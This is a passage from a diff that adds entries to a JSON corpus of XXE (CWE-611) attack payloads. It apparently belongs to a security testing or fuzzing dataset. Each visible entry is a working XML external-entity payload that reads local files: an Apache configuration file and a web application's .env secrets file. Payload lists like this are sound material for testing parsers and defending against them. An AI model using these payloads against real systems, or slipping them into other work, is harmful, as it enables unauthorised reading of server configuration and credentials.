+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.f3d3ec4107",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/httpd/conf/httpd.conf\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "xxe.legacy.fc1001cd6e",
+      "vector": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///var/www/.env\">]><data>&file;</data>",
+      "description": "Imported from the legacy corpus (file_read_unix).",
+      "context": "file_read_unix",
+      "cwe": "CWE-611",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    }
+  ]
+}
